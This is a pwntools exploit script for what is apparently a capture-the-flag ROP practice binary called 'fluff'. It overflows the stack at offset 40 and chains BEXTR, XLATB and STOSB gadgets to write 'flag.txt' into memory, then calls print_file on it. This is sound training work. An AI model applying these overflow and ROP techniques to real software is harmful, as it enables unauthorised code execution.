#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fluff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fluff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'.'
# Stripped:   No


# search -t byte <val> fluff in GDB
ZERO = 0x601018 # + 0xb = 0 since rax is 0xb when we start our rop chain
F    = 0x4003c4
L    = 0x4003c5
A    = 0x4003d6
G    = 0x4003cf
DOT  = 0x4003c9
T    = 0x4003d5
X    = 0x400246

BSS_SLOT = 0x601100

# wrap this ugly BEXTR gadget up to look like a nice MOV in the rop chain
def mov_rbx(val):
    if type(val) is bytes:
        val = int.from_bytes(val)
    return flat(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p8(0) + p8(64) + p16(0) + p32(0) + p64( (val - 0x3ef2) & 0xffffffffffffffff )

# val should be an address holding the byte you want or you'll get SEGFAULT
def mov_rax(val):
    return mov_rbx(val) + flat(XTALB)


RIP_DIST = 40


STOSB_RDI_AL = 0x0000000000400639
XTALB = 0x0000000000400628
POP_RDX_RCX_BEXTR_RBX_RCX_RDX = 0x000000000040062a
POP_RDI = 0x00000000004006a3
PRINT_FILE = 0x0000000000400510

io = start()

pause()

io.sendline(cyclic(RIP_DIST) + 
            mov_rax(F - 0xb) + # if we had more room on the stack we could ignore all the subtraction but we cannot rip
            flat(POP_RDI) + flat(BSS_SLOT) +
            flat(STOSB_RDI_AL) +
            mov_rax(L - ord('f')) +
            flat(STOSB_RDI_AL) +
            mov_rax(A - ord('l')) +
            flat(STOSB_RDI_AL) +
            mov_rax(G - ord('a')) +
            flat(STOSB_RDI_AL) +
            mov_rax(DOT - ord('g')) +
            flat(STOSB_RDI_AL) +
            mov_rax(T - ord('.')) +
            flat(STOSB_RDI_AL) +
            mov_rax(X - ord('t')) +
            flat(STOSB_RDI_AL) +
            mov_rax(T - ord('x')) +
            flat(STOSB_RDI_AL) +
            flat(POP_RDI) + flat(BSS_SLOT) +
            flat(PRINT_FILE)
            )


io.interactive()

